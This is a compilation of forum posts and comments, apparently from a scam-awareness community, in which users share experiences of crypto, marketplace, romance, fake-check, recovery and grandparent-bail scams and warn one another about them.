- They can't just take money from him unless he gave them passwords or something. It sounds like he didn't, because if he did they wouldn't need to try to convince him to withdraw the money so they can scam him again.
- It's great that you were able to help your dad before he lost much money.

Of course they are pressuring him to continue. They thought they had a big fish on the line, but he slipped off and swam away. They are hoping to get thousands of dollars from him, and they only got $350.

Was he getting involved in cryptocurrency trading? Many of the investment scams are crypto. How it works:  Some investment guru contacts you on social media, and convinces you to trade on his super special guaranteed website. You start small, maybe $100. At first you make money. You withdraw a few hundred. Looks good. Then you put in a few thousand. And the screens show that you've made a huge profit !! So you try to withdraw some. Oh, but they tell you that you have to pay taxes. You put in more money. Oh, now they say you have to pay transfer fees. . . . 

Eventually you realize that you cannot withdraw any money. Whatever you put in is lost, and the profits are all fake.  **There is no investing site or app, that's all lies.** There is no profit. The screens that show how much you made? Just numbers on a screen to make you believe that you were making money.  Scammers make a whole fake crypto website. It's not hard to create a website.

So you have helped your dad to not lose thousands of dollars. Good work.

- My elderly mother was being targeted by scammers and the only way to make it stop was to get an unlisted number. The phone company was very good once I explained the issue. I also do not let the phone record any messages and we only answer calls from people we know.
- You CAN get out of a scam:

Accept that any money you‚Äôve put in is really gone forever, then walk away.

Block _all_ attempts to continue contacting you, and (hopefully) LEARN from your mistake and ***NEVER DO ANYTHING SIMILAR AGAIN!!***

Reporting it to the relevant authorities is a good idea as well, if ***only*** to get the lost money counted stastically in the _vast_ amount of money lost each year to scammers, sadly‚Ä¶

Obviously I don‚Äôt mean you specifically, but ‚Äú***any*** you‚Äù out there in this situation, including OP‚Äôs father.

Title: Used Graphics Card Scam. Lesson Learned.
Body: Throwaway account and post, just wanted to share my story for anyone in a similar boat as me.

Tried to buy a used 4090 GPU off Facebook marketplace, and managed to find a seller after a few weeks of looking around. I finally got a response back from a seller, willing to meet in person! I met up with them, checked out the card and paid them in cash and we were both on our way. I was even more certain that it was the real deal because it came with an invoice from a local retail chain.

Fast forward to a few days later when I tried to install the card. Upon installation, I noticed the card wasn't working, no power to it no life in it. Thought maybe it was a connection issue. Troubleshooted for a few hours and nothing. Eventually ruled it out to be that the card was potentially damaged. I contacted the seller who responded saying he had no issues with it while he used it, and that I should use the warranty. I checked the serial number and it was in fact covered, so all was good... until I contacted the company and was told that the card wasn't sold in my country despite the invoice indicating so. That's when things got weird, I called the customer service of the retailer the invoice was from and explained. Upon searching up all the information, they determined that the invoice wasn't real, imagine that, a fabricated invoice. All the information on it was EXTREMELY close to the real thing, so it would have been impossible for me to tell without knowing exact details that I learned on the phone with the rep.

I contacted the seller explaining, and they responded saying it wasn't fake, and they didn't understand. An hour or so later, their account disappeared. I had been scammed! I'm left here now with a potentially stripped GPU (I might open it up and look around) and I'm down several hundred dollars.

Ultimately, it's my fault, I've read horror stories and saw that most people buying secondhand recommended seeing it in action in person. I thought to myself, no way I could be scammed, I'm looking this person in the eyes. Boy was I wrong. Anyway, for those who are trying to buy used graphics cards, beware! I hope you don't make the same mistakes I did, it's not a great feeling once the dust settles. I appreciate anyone who takes the time to read this, I'm mostly feeling embarrassed by this whole ordeal, but I figured it would be a shareable lesson for anyone who might be thinking similarly to me. Feel free to call me an idiot, trust me I know. Lesson learned. Thank you again for reading!

- Facebook Marketplace is a scammers' paradise.  I hope someday people get that.
- Are you in california by any chance?
- Lesson learned, never used it before either, my very first interaction with it. I usually use a local buy and sell that's been good to me for the better part of 5 years. Unfortunate.
- Negative! Sorry :(
- For hardware you can‚Äôt test in person it‚Äôs a fools paradise at Facebook. You can‚Äôt tell anything about a seller - the account is easily stolen or fabricated. You have no protections. 

eBay is the only place I‚Äôd buy used hardware since it‚Äôs a protected transaction when you use PayPal and you have some chance of recovering from faulty or scammy transactions. 

Even there it‚Äôs easy to cobble up a fake card which is mostly worthless. You might never get money back for that.
- Yeah, I had no idea it was this vicious, I had heard stories. I thought because I was meeting them in person and they had a receipt it was easy enough to verify. I feel ashamed and incredibly embarrassed more than anything else.
- Have we gotten to the point where a buyer needs to bring their PC and an inverter, set up in their car, to test things like this before buying?
- Seems that way, sadly. Hard to do during Winter. Oh well, my fault.

- !muse scam.
- !muse scammer. report and block
- !muse scam.
- Well‚Ä¶we seem to be in agreement. :P
- the scam will work like this

they will insist on paying you   but  send you too much money  and ask you to send the excess money  to someone  either back to them or  buy  something or  to a charity

whatever you send it's  your own  money  because  in  4-8 weeks later that  original money will be taken back from you
- Hi /u/fallwind, AutoModerator has been summoned to explain the Muse scam.

The muse scam is a variant of the [fake check scam](https://consumer.ftc.gov/articles/how-spot-avoid-report-fake-check-scams) in which the scammer will contact the victim over social media and claim to want to use their image for an art project. The scammer will often use a stolen social media account to increase their credibility. They will offer a generous sum of money and offer to pay via check, and the victim is instructed to send money to the scammer for ‚Äúmaterials‚Äù via an irreversible method. The victim is under the illusion that the funds cleared when the bank makes the money available thanks to current regulations. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months.

If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. You can summon the fake check automoderator explanation using the trigger fakecheck. Thanks to redditor aNeatHat for this script.

This is a scam where a scammer impersonates an artist. For the scam where a scammer targets artists, call the automoderator trigger (artist)

- Scam. The site you purchased your item from was a scam and the shipping company is run by the same scammer. They'll keep hitting you with fees/taxes/"refundable" insurance... until you realize and stop paying them.

Also watch out for !recovery scammers. No one can get your money back or track down the scammers.

!whois [compasspointshipping.com](http://compasspointshipping.com)

Site is only 6 months old, only registered for one year (meaning they don't plan on being around), filled with generic text that repeats on different pages/stock photos, the ONLY contact info is a fake phone number (123-456-7890!!) and email, no locations!
- Hi /u/1Cattywampus1, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.

Title: New in-store pick up scam? Update on previous post
Body: Hey all!

I just wanted to give a quick update on my situation from a couple of weeks ago from this post as it gained a lot of attention:

[https://www.reddit.com/r/Scams/comments/1hrj9pz/best\_buy\_online\_order\_stolenpicked\_up\_by\_someone/](https://www.reddit.com/r/Scams/comments/1hrj9pz/best_buy_online_order_stolenpicked_up_by_someone/)

Fortunately, I reached an amicable conclusion and got a refund for my computer purchase. So I appreciate BestBuy for doing what they could at the time. For this post, I wanted to share my experience so that anyone in my position can better understand what to do and talk about the new? scam of getting your stuff stolen during the time of in-store pickup.

First and foremost, the best way to contact BestBuy was via social media(Facebook/Instagram). Shout out to the social media team for keeping me sane. They were the only ones I felt that made appreciate efforts during my numerous attempts to contact BestBuy. You da real MVPs and deserve a raise! Initially, I attempted to contact them via their support phone number, however, I was 50/50 in my experience with the call line. Both were offshore dudes from what I assume to be India. One guy was helpful with the process of filing a fraud claim with the company whereas the other guy gave me the runaround and told me to go back to the store in-person and said that was their problem even though the instore manager told me they couldn't do anything without corporate approval. If you are ever in this situation, going the social media route will save time and effort.

As the saying goes, "the sqeacky wheel gets the oil" and I did what I could to put pressure to get this resolved whether that be: making multiple subreddit posts to garner attention, posting google reviews, filing a police report, filing reports online on FTC/etc. Was it all a bit much? idk, but my issue got resolved so I don't regret making a fuss.

From what others shared on my initial post, this scam of stealing your account information and taking your purchase by another party during instore pickup is not unique to me or BestBuy as it has been happening at Apple and other stores. I, like most of you who use in-store pickup to prevent the situation of porch piracy, assumed in-store pick-up was the safer option and will now have some hesitancy when doing online pick with an expensive item. What I can take away from this situation is to take security on all accounts seriously, even the Chipotle order. My question is what else can we do to prevent this? Although I have initiated 2-factor authentication on the BestBuy account, I do understand there are limitations to that feature.

Again, I appreciate the BestBuy team for getting this issue resolved.

Title: Could this be malicious or just a prank?
Body: I got a call today from a no caller ID that sounded like a girl I know saying ‚ÄúOP please pick me up I‚Äôm at (blank) and a guy is following me *scream*.‚Äù After that, the line cut out and I called the police as well as the girl I thought it was. 

She eventually got back to me and was fine so I called all of the other girls it could‚Äôve been and they are also fine. I have now learned that the only way no caller ID can be used is if it was intentional.

So now I‚Äôm left wondering if there‚Äôs anyway this could be deeper than just a messed up prank. Also wondering if something similar has happened to anyone else.

Last little note: I have heard of people using A.I. to mimic people‚Äôs voices to scam loved ones. Is this true? And could this even be the case considering they knew my name and a niche place I‚Äôm related to?

- Not uncommon scam. A search of the sub for ‚Äúscream‚Äù will turn up several dozen. 

Guess I‚Äôll commend you for your concern but it was a waste of everyone‚Äôs time. 

Well you got a No Caller ID which can be set by anyone. Caller ID is worthless. 

They obviously knew your name since they knew your phone number. It‚Äôs public information 

No one is using AI to mimic a voice for audio scams except perhaps from a very well known person. There‚Äôs no need - people will make the assumption the voice is known as you did. It was just a random girl working for the scammers.
- Thank you for the reply. After a lot of thinking, I‚Äôm pretty sure someone was just doing a messed up prank.
- That is really sad. 
I'm sorry that happened to you. I commend you for your care of the people around you.

Title: Psychology: AVPD + Greed + Ignorance = Perfect mark for scams
Body: Speaking for myself. I fell for a cyber scam last year which to this day still haunts me. I realize besides the greed (FOMO and get-rich-quick mentality) and ignorance (ignorance of crypto, investment, and related scams) in general, I was also the perfect mark for the scammers because I always had this insurmountable Avoidant Personality Disorder (AVPD) that made it especially difficult for me to say no to other's suggestions, good or bad. During the scam, I didn't even attempt to "bargain" or "negotiate" with the scammers by going along with their earlier promise to "stack up" the funds to a higher total (fake of course), which could have saved me from giving so much of my money away in the end, as if any of that negotiation would have offended or displeased them so much that the money-making opportunities would be taken away. It could have been the combination of the above three in that heightened emotional state known as the "ether" that made me fully compliant without questioning or bargaining.

I know for short cons, in a state of panic and fear, many people tend to obey authority figures without thinking. But what about the general tendency to say yes to others because of AVPD in long-cons? Any other scam victims share similar experience?

Note: I have since changed. So to all the recovery scammers out there: don't even try to pull your tricks on me. I promise it won't work a second time.

Especially to those who are "online" friends.
And after watching a video of a woman, who venmo herself money while using a stranger phone, I say no to lending my phone to strangers.
- Well really just ignore bold claims and ... just say no. Nothing outside of that

- Glad I'm an asshole and will say "no" to people just to infuriate them, even when I *ought* to say yes.

Title: Lowe's receipt scam?
Body: So, I've received 2 emails saying I've purchased items at Lowe's, but I have not (came from do-not-reply@ receipt.lowes.com). I went directly to Lowe's website separately and not using any links in the email. I don't even have this email connected with Lowe's as it says to create an account when I try to log in with it. I'm not sure I get what's happening with this. I guess to click around in it? Aqua mail on Android does says it's part of a mailing list so sounds like it might be sent around to multiple people?

Oddly enough, I go to my Gmail on my PC and the email isn't even there.

- OP, please check my comments here.  You should call a VALID Lowe‚Äôs corporate/centralized number to ensure there is no order related to you that you didn‚Äôt actually make.

Commenters have told you very quickly that ‚Äúreceipt.lowes.com‚Äù is not valid; HOWEVER, the commenters who posted that do _NOT_ apparently understand the existence of nor how **subdomains** actually work.

It is at least possible that this email receipt is _valid_.  You should call a KNOWN and TRUSTED corporate/central number for Lowe‚Äôs to confirm.

Take care and good luck!
- Receipts or confirmation orders? It might also be someone fat fingered your email address for yours at checking.
- That email is not a legit Lowe‚Äôs email. I‚Äôm sure th goal is to respond to the email panicking that you didn‚Äôt buy anything, their ‚Äúcustomer service‚Äù responds and helps you by canceling the order with some sort of money exchange. Delete all emails like that and report it as spam
- Go to mxtoolbox.com and check the domain of suspicious senders.  There is no registered domain of receipt.lowes.com.
- How do you know for sure?  The Lowe‚Äôs domain is actually valid, and the ‚Äúreceipt‚Äù portion before the first dot is called a ***subdomain***.

**Subdomains** are created under main domains (THEY ARE NOT SEPARATE DOMAINS) usually for a specialized purpose, for example, when sending out customer receipts‚Ä¶

The only way to be sure in this case is to call Lowe‚Äôs corporate directly and determine for one thing if they even send out receipts like this from a special subdomain they created just for that purpose (**ENTIRELY POSSIBLE**), and then also find out from them if this purchase receipt is real or not.

It sounds like the account is not OP‚Äôs anyway, and likely isn‚Äôt using OP‚Äôs card, BUT, it would be best to call Lowe‚Äôs directly via a **KNOWN** and **TRUSTED** number for Lowe‚Äôs (also, it should be a corporate/national number rather than a local store number OP calls).

The ironic thing here is that the email address actually looks potentially ***legitimate***, which is a good reason for OP to call Lowe‚Äôs and ensure there is no order/fraud related to OP in any way‚Ä¶
- Well the ‚Äúreceipt‚Äù part would actually be a ***subdomain*** under the main domain, which is lowes.com.  Lowes.com is definitely a valid domain, but whether or not they normally send out receipts under a ‚Äúreceipt‚Äù subdomain is another question entirely‚Ä¶

One thing OP _should_ do is to call Lowe‚Äôs directly (preferably a corporate centralized number rather than a local store number).  But OP must make VERY SURE that they‚Äôre calling a valid number for Lowe‚Äôs, and not some scam number in Google ‚Äúsponsored‚Äù results, for instance‚Ä¶
- There‚Äôs no dns record for that subdomain.  It doesn‚Äôt resolve to anything.  No MX, A, or CNAME.  It was made up.
- With neither an A nor a CNAME entry you absolutely have a valid point, thank you.

Initially stating that there‚Äôs ‚Äúno registered domain‚Äù was not a great description, though.

I think it‚Äôs also a good lesson in understanding what subdomains actually are, and how they can be used validly by companies (does not sound valid in this case though with the lack of any A or CNAME entry).

In any case, thanks for the follow up - it‚Äôs appreciated!

Title: New Security System scam going around
Body: Okay so a friend of mine just got offered a job by one of his buddies who's working out of town. 
He started talking to his buddy and that guy's started sending him pay stubs of over $10k a week. 
Apparently these kids are riding around retirement communities and finding homeowners with Honeywell and Adt security systems. They knock the door and ask if the system is a new digital system or the older phone line/internet based ones... 

From there they take a look at system, convince the homeowner the upgrade is free and included with their inital system payments and knowingly getting these people to sign long term loans with absurd interest rates that if are unpaid put massive leans on their properties.

He asked me if I thought it was a scam, and i told him upgrading the security system isn't a scam but they way they're teaching you to sell it 100% is a scam and couple in return having him facing legal action if the right homeowner ever wanted to push the issue. 

10k a week in commissios... who knows how many people are being swindled....

We will need a bigger hint. What is the purpose? What are they wanting you to do?
- Hi /u/vitaminxzy, AutoModerator has been summoned to explain the Job scam.

Fake job scams come in many different varieties. The scammers will usually conduct interviews over Whatsapp, Telegram or Teams. They will offer high wages for the work being done, oftentimes with wildly varied wage ranges by hour, and they will \"hire\" you by telling you that you are hired, rather than going through the normal process that a company takes when hiring an employee in your country.

If they mention anything about a check or about receiving and sending out transactions, it is a [fake check scam](https://www.consumer.ftc.gov/blog/2018/09/anatomy-fake-check-scam). If they say they will cut you a check so you can buy equipment for remote work, it's a scam in which they make you purchase equipment on a fake website under their control, with your own card, and when the check bounces in a few weeks you're left holding the bag (and the equipment never comes)

If they mention anything about receiving, processing, or inspecting packages, it is a [parcel mule scam](https://en.wikipedia.org/wiki/Parcel_mule_scam).

If they ask you to purchase items up-front, ask you to pay a fee in order to be hired, or ask you to purchase gift cards, it is an [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam). If they mention Bitcoin ATMs, [it's always a scam](https://coinatmradar.com/blog/avoid-scams-dont-use-bitcoin-atm-when-someone-asked-you/).

If the job involves posting advertisements on Facebook Marketplace, Craigslist or eBay, they are using you and your account to scam other people (especially if it's rental listings). Thanks to redditor AceyAceyAcey for this script.

Title: X2025.org send BTC,ETH,DOGE and get double back
Body: Has anyone seen this textbook scam? Supposedly it appears Elon Musk is sponsoring this x2025.org ‚ÄúCrypto Giveaway because trump has won and will do wonders for crypto‚Äù. Whatever troll farm created this and is continuing to distribute this info via social media I hope you all experience great the powerful force of karma(Sadly that never happens). I wish people will be smart enough to follow the saying ‚ÄúWhat‚Äôs to good to be true, is usually never true‚Äù is something to keep in mind in this technological jungle we call life, and that they don‚Äôt fall for this repetitive send x amount of crypto and we will send double back! Hahaha it‚Äôs so stupid that it actually might work‚Ä¶. Anyways I didn‚Äôt find any posts with this tag so figured if you were gullible enough to try feel free to share your experience. Keep in mind the creator of this scam will prolly use some fake bots to say it‚Äôs legit so just use ur judgement and remember always research information from multiple sources before believing anything 100%

- Oh, it works. Most famously in the case of the German guy who sent $500,000+ worth of bitcoin:¬†

https://www.bbc.com/news/technology-56402378

If you search our sub for the phrase 'crypto multiplication', you'll find lots of our previous posts on this scam (well, at least the ones that I replied to).
- Sigh. It‚Äôs true that Trump has helped crypto a bit (ignoring his scam coin which has lost people their life savings) but maybe 10% over the past couple weeks. 

You might get 30 or 40% back on well known cyber currency like Bitcoin or Etherium over 6 months but other fly by night currency is going to only make money for the minters. 

It‚Äôs no different than gambling in Las Vegas.
- I‚Äôm lost for words‚Ä¶‚Ä¶. No wonder why so many scammers are around nowadays. People will always fall for the stupidest and simplest scams. SMH
- Oh you didn‚Äôt visit the website did you? I know crypto fluctuates. This site is telling you to send .5 btc and they will send you 1 btc back and I only mentioned trump because they are associating him winning and Elons friendship to him as a description on the site as to why they are able to 100% double anything you send them in mins. But yeah crypto is gambling just like Vegas but this site is a 100% loss

- It's obviously fake. Plain text file sent from a random number with no date, vehicle, name, or any other details, mass-texted to a lot of numbers. Low effort, but someone out there will fall for it. Don't open random files you get from unknown sources. That's how you get malware.
- They wouldn't text or email you regarding an unpaid toll. You would get a letter in the mail regarding said toll with an option to either pay by phone, sending a check or going to the website and paying it with a credit/debit card. Not sure where you live, but here in Pennsylvania we would go to the turnpike website and pay it there: [https://www.paturnpike.com/toll-by-plate](https://www.paturnpike.com/toll-by-plate)
- FYI, it's really not a good idea to even open **any** PDF files.
- Yes, there's been recent posts about it - just report the number and ignore it.
- My mom gets toll notices quite often from states she's never been in. So crazy. She always calls and says it's not her and they clear it out.

- You can't stop people from calling you. After all, this is what phones are for. I believe the best you can do is have callers that aren't on your contacts list sent directly to voice mail. That won't stop the voicemails, but you won't receive rings.

Title: Constantly getting calls from Cigna as if I've got coverage. Scam or just a mistype?
Body: I've gotten multiple calls from Cigna at a number listed on cigna.com as "billing/payments." The number seems legit and they leave voicemails requesting I call back regarding updates to my coverage, in one case mentioning a first name (e.g. "this call is for Martha") I don't recognize. I called back once, said I'm not Martha and you have the wrong number, and got an agent who apologized and thanked me for letting them know. I haven't been asked for any personal info or called any number I didn't verify online. 

They're still calling me, still leaving voicemails  regarding a supposed active  policy, and the phone tree recognizes my number as associated with an account. I called back again and spoke to someone who doesn't speak good English and did ask for my own information to check for an account, and I provided my name only and repeated I don't have a Cigna account. I _think_ she was just not understanding what I was saying, but it got me worried. 

I'm assuming somebody mistyped a number when setting up an account and I just can't get anyone to help remove it, but is this an elaborate scam or just bad customer service? If it's legit I do want to get my number removed so that the actual Cigna customer will receive their policy info.

Title: Help elderly father being scammed
Body: My father recently got a new fiance from the Philippines who's half his age. Now he sends almost all his money he gets it's gotten to the point that he sold his house got his car repossessed and now stays in a bed in my living room. Hey doesn't believe anyone that he's being taken on a ride. So is there anyone out there that this has happened to or has a parent that has done this. I'm just trying to figure out a way to show him the truth or a way to figure out how I can get this to stop. This is really the first time I've used Reddit so I don't know if I'm doing this right. But if anybody can give me any information that would be great. Thank you.

- He basically is free to throw away all his money. But if you keep paying the bills for him, you're the one getting scammed.

The only way he'll learn is if you stop picking up after him. Not your fault at all: but let him hit rock bottom. Otherwise he'll keep draining you and your family.
- This is a very common !romance scam. There will be a comment below giving further details. 

If you search this subreddit for "romance scam" you can find many other examples of people whose elderly parents got snared in this scam and you can try to show them to him. But even if you show the posts to your father, he may not believe you. In other words, you may not be able to stop it. He is addicted, and he also doesn't want to admit that he was wrong. 

The person is probably not a woman and may not be in the Philippines. He has already lost everything, so your most important job now is to protect yourself as much as you can. Do not give or lend him any money. Do not let him have access to your financial information, your social security number, bank number, credit cards, etc. Make a plan for where he can live once you've had enough of him being in your living room. That may mean some very tough decisions.

Here's a government tip sheet about the romance scam. [https://www.bulkorder.ftc.gov/sites/bulkorder.ftc.gov/files/publications/936a-pio-romancescams-tearsheet\_508.pdf](https://www.bulkorder.ftc.gov/sites/bulkorder.ftc.gov/files/publications/936a-pio-romancescams-tearsheet_508.pdf)

You can also reach out to AARP. Copypasting this from an earlier post: Their Fraud Watch Network Helpline is available Monday through Friday from 8 AM to 8 PM ET and can be reached at (877) 908-3360. The helpline is free and offers support from trained fraud specialists who can help with: Reporting a scam, Getting guidance on what to do next, Learning how to avoid scams in the future, and translation services.
- OP, I'm sorry you're dealing with this.Romance scams are difficult to deal with, the victim just doesn't want to believe that they're being scammed.

Is it possible to get a trusted family friend to talk to him? Often parents will listen to an old friend or an authority figure when they won't take advice from their children. Is there a minister, lawyer, or local police officer that will explain to him what's really happening?

There are steps you can take to help him see that this is all lies. AARP has resources on their website. Can you sit down with him and watch YouTube videos about romance scams and catfishing together? John Oliver, Social Catfish, Dr. Phil. The US TV show *60 Minutes* did a good segment on scams, I think it's available online.

Some people have been able to help scam victims through a guardianship. This is from a comment on another post:  

*Summary: the Redditor is managing all finances for an elderly relative, and was able to get US Social Security to appoint her as the designated payee for retirement pension benefits.*

"After relative lost thousands to scammers, I explained the situation to the primary care physician, who examined my relative and completed paperwork explaining why my relative was incapable of managing finances. Then the US Social Security office appointed me as the designated payee for relative's Social Security payments.  Opened a new bank account. I use the new account to pay bills. All bills were delinquent - utilities turned off- because every penny was given to the scammers. I provide my relative with store gift cards to pay for groceries and other items. If they figure out a way to convert the store gift cards to cash, I will just stock the house with groceries and household items."

If he's still in denial after that:  another Redditor suggested taking your parent to a homeless shelter / soup kitchen, and telling him that this is where he's headed.
- Even if the new fiancee was a real person, when she finds out he is homeless and has no car or job then she won't be interested in him anymore.  Ask your  dad if she did fly to the US to get married, where and how would they live?  It would have been much cheaper for him to fly to the Philippines to meet her in person than get scammed....or has he met her already?
- It's been said before when others have reported loved ones who are victims of romance scams: treat the victim like a drug addict.  Do not provide any support *including a place to sleep*, do not give any money, do not give any food.  Give advice but that's it.  Sometimes people have to lose *everything* before they wise up.

Alternatively you can petition the court for guardianship of your father so you can take control of his finances.
- Maybe browse through the numerous Dr Phil romance scam videos on YouTube until you find one that closely matches your father's situation. Think of Dr Phil what you may, but he does have the knack for exposing just how ridiculous is the mindset of the "victims".

- Twenty times a day on here on slow days.

Sorry to tell you this he'll not stop just make sure he can only get at his money, as soon, if he's not now, he'll be using other peoples money as well.
- You can try contacting adult services in your city/county. I'm sure they've heard similar stories and can give advice on what your options are

- Hi /u/Pale_Session5262, AutoModerator has been summoned to explain the Romance scam.

Romance scammers pretend to be in love with their victims in order to ask them for money. They sometimes spend months grooming their victims, often pretending to be [members of military](https://www.cid.army.mil/romancescam.html), [oil workers or doctors](https://www.consumer.ftc.gov/articles/what-you-need-know-about-romance-scams). They tend to be extremely good at taking money from their victims again and again, leading many to [financial ruin](https://globalnews.ca/news/5095659/romance-scam-money/). Romance scam victims are emotionally invested in their relationship with the scammer, and will often ignore evidence they are being scammed.

If you know someone who is involved in a romance scam, beware that convincing a romance scam victim they are scammed is extremely difficult. We suggest that you sit down together to watch Dr. Phil's shows on romance scammers or episodes of Catfish - sometimes victims find it easier to accept information from TV shows than from their family. A good introduction to the topic is this video: https://youtu.be/PNWM5nuOExI -

Title: My Friend's Elderly Parents Dodged the Scam, But Only by Sheer Luck
Body: This is one of those scams that terrify the elderly into immediate action.  My friend (I'll call her "Sally" to make this story flow better) was recently travelling home via rental car after visiting her adult children and her elderly parents.  A few days after Sally arrived home, her elderly mother called her to ask her how to "get the money to" her.  Sally, of course asked, "WHAT money?"

Sally's elderly mother said that she was trying to send money pay Sally's bail.  Her elderly mother had received a call on their landline house phone in which she thought Sally was crying and asking for her parents' help.  Then a scammer pretending to be law enforcement told the elderly lady that Sally had hit an 8-month-pregnant lady with her car and was to be charged with manslaughter if the lady or infant died.  They asked this elderly lady to go to the bank to get $17,000 in cash to send for the bail.  The elderly lady and her husband immediately set off for the bank (in the very small town) and were trying to make it happen.  They were tripped up a few times by sheer luck as they tried to either get a cashier's check or wire the funds.  At some point they were on the elderly ladies cell phone with the scammer while at the bank.  The details are unclear, but eventually a bank employee alerted the supervisor at the bank branch, and he had them call Sally directly.  The money was not lost, but the elderly lady still asked Sally, "How is the lady and the baby that you hit???"   

This elderly couple are "in their right minds," and strongly resent and resist their adult kids in assisting them with advice.  That happens a lot, and makes them very vulnerable.  Sally's mom is trying to sell some items online, not sure what platform, but that could have been one of the ways in which the scammers were able to hone in on her.

- Just like you have to have "the talk" with your kids, this will have to go for our elders as well.  I already told my mom that if she gets a phone call like that, tell the people on the other end, "I hope you throw away the key this time and NEVER let him out!" or say something to the effect of, "Whatever he did this time I'm not forgiving him!" and one of two things will happen. Either the scammer will just hang up or they'll completely lose their marbles and call you every dirty word in the book.  Either way, you still win.

Normally if someone gets into trouble and gets arrested, at some point during the process they'll get the opportunity to make a few phone calls.
- That was a relief! Kudos to the bank for doing excellent service. Still unfortunate that the elderly still have not fully understood what just happened.
- It can happen at any age.  They are professionals.
- Something similar happened to my grandma. She received a call from some pissed off guy claiming her granddaughter had hit his ‚Äúluxury‚Äù car and he wanted payment that instance. They even handed the phone over to a girl who was crying. My grandma automatically assumed it was me and got into panic mode asking where she could send the money. The only good thing is that my grandma called my mom to tell her what was going on and my mom saw all the red flags and called me directly while I was at my house cleaning lol. But it was sooo annoying cause afterwards both my mom and grandma were acting like it really happened and kept telling me to be careful and not to go out alone. I kept telling them maybe you guys should be the ones more careful and not answer unknown numbers
- I think this scam bugs me the most.  It is the combo of someone impersonating a police officer along with targeting a relative with the claims of a loved one in peril the really bugs me.  I get that all the scams that are run are awful, but this one really pisses me off.
- Good for all this worked out for the best. I occasionally have the ‚Äútalk‚Äù with my parents who are pushing 90 and independent and stubborn for sure. My ‚ÄúTalk‚Äù is me telling them a type of scam happened to me and give an example and it was scary that I almost fell for it and that way they are alerted but it is not me telling them what to do like they are children or not capable. They go for it every time and then go tell their friends what almost happened to me. Lol
I will do anything in the world for them.
- So like, cops don't ask for bail, the arrested person does.¬† And that phone call, like a collect call, has a pre-recorded message that "you are receiving a call from an inmate at X facility, this will be recorded and used against you in a court of law" and it usually plays twice, just incase you're not listening the first time.¬† Bail, like any court fees, is paid in person at the courthouse.¬†¬†


Gawd forbid they listen to anyone younger than them.
- I have parents in their 80s. The fortunate thing about hanging out on the sub is I‚Äôve learned so much and I tell them all about it so now they take great pride if somebody contacts them with messaging me to make sure everything‚Äòs fine before they do anything. Educate your parents as much as you can
- Same thing happened with my mom, but my nephew didn't have his license yet so she contacted his mom before doing anything and discovered the scam.
- Old people power. My wife's mother is notoriously bad about following directions when her computer is broken to the point that she will just drive it to me or I fix it at her house when something comes up.

Who knew this was a super power! She got one of those McAfee scams where she owed them a bunch of money for software she didn't even have.

They tried for over an hour to get her to install some kind of remote control software and eventually the Indian dude got so frustrated that he told her that her issue was resolved and not to worry about it.
- ...and Banks continue to be BLAMED for NOT preventing incidents like this when in fact, they do at every opportunity. Too bad, because at some point in the near future, Banks will start to be financially accountable when dumb-a##es keep falling for sh\*t like this and other related farcical B.S. - - we'll ALL WIND UP Paying higher fees, lower CD & Savings rates, and HIGHER Lending rates to once again, subsidize the Scam Victims
- This is such a terrifying scam, and it's heartbreaking how they target elderly people who just want to help their loved ones. 

Kudos to the bank employees for stepping in and preventing a financial disaster‚Äîthat kind of awareness can truly save lives.

For anyone reading this, it‚Äôs crucial to talk to your elderly family members about these scams. A simple plan like asking them to verify any emergency story directly with another family member could help them avoid these traps. 

Remind them: if it‚Äôs urgent and sounds scary, it‚Äôs worth slowing down and checking first.
- You need to have a serious talk with your mom about not answering the phone if she doesn‚Äôt know the caller. This could have gone soooo bad for her.
- It‚Äôs going to get worse with the advent of AI. We will go from someone claiming to be their grandson Kevin (lots of static on the phone) to having an AI with Kevin‚Äôs actual voice saying all the prompts. How hard can it be-grandma posts a video on Facebook with Kevin talking about how he lives his grandma-whatever. For a scammer to create a believable script

I get scam texts and emails everyday. The number of phone calls has actually dwindled over the past few years. I think I practice safe internet use but I have clicked on the random sus Nextdoor link (supposed to be ring footage of a porch pirate). Ahhh. I read this sub redit to try and stay ahead of the less obvious scams. 

Keep posting the new ones so we can all stay one step ahead.
- Reminds me of when my buddy works for a bank and once denied a $10k withdrawal to a woman who had clearly fallen for a romance scam. Better to risk losing a customer than being the person/bank who let someone fall prey to a scam
- Thanks for all the comments regarding my friend's parents' close call.  I have been giving their situation more thought, because it's so weird when these things really happen to people you know.  Weirder still that the scheme fell apart and they didn't lose their cash.  They are 83 and 89 years old.  But as I said before, they are fiercely independent.  One of the weird things about the circumstances of the call her mom received is that in the shock of the moment, the story seemed PLAUSIBLE ... because my friend had just left on this long drive back to her home, and her elderly mom was convinced this supposed accident had happened somewhere along the way.  

Right now, my friend's 83-year-old mom is rehoming her dogs due to difficulty providing the proper care due to her age.  My friend was able to help her rehome 7 of 10 dogs while she was here with her parents.  Now this elderly lady has 3 left.  For two of the dogs, she is trying to SELL them.  The others were rehomed to great homes for free.  In trying to sell these two dogs, she has been "advertising."  Some of the advertising is through notes on bulletin boards and some is on the internet & who knows what else.  At 84, she loves her internet and doesn't really share with my friend as to WHERE she put those ads.  I wonder if she had her home phone # on one of the ads, and someone called her to talk about the dogs and then realized she would be a perfect target for this scheme.

